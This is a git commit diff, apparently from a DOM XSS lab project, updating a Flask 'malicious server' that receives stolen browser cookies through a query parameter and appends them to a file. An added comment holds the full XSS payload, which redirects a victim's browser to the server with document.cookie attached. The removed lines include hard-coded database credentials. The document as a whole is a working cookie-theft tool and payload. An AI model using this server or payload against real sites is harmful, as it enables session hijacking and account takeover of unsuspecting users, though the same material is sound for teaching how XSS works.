8e5f7cb10c3e63b35b636ae01156ccd5626817ee
Nuri Irfani <44119295+Nuri-Irfani@users.noreply.github.com>
2023-05-03 16:28:09 +0800

    added comments

--- www/html/DOMXSS/malicious_server.py
+++ www/html/DOMXSS/malicious_server.py
@@ -1,30 +1,21 @@
 #PLAN: 
 #    Learn + use Flask
 #    Find out how to run a 2nd server simultaneously
-#    Use malicious server to get victim's cookies
+#    Use malicious server to get victim's cookies and save to file
 
 from flask import Flask, request, redirect
-import mysql.connector
-#from datetime import datetime
 
 app = Flask(__name__)
 
 @app.route('/') #home URL
 def cookieburglar():
     
-    #get cookie & store in a txt file
+    #get document.cookie from xss payload, send to malicious server & store in a txt file
+    #xss payload: <script language=“JavaScript”>document.location=“http://127.0.0.1:5000/?c=“+document.cookie;</script>
     cookieburglar = request.args.get('c')
     f = open("/home/tic/Documents/cookies.txt","a")
     f.write(cookieburglar+ ' ' + '\n')
-    #f.write(cookieburglar+ ' ' + str(datetime.now()) + '\n')
     f.close()
-    
-    conn = mysql.connector.connect(user='lsuser', password='tic123', database='loginsystem')
-    cursor = conn.cursor()
-    insert_cookie = ("insert into cookies (cookie) value (cookieburglar);")
-    cursor.execute(insert_cookie)
-    conn.commit()
-
 
 if __name__ == "__main__":
     app.run(host = '0.0.0.0', port=5000)
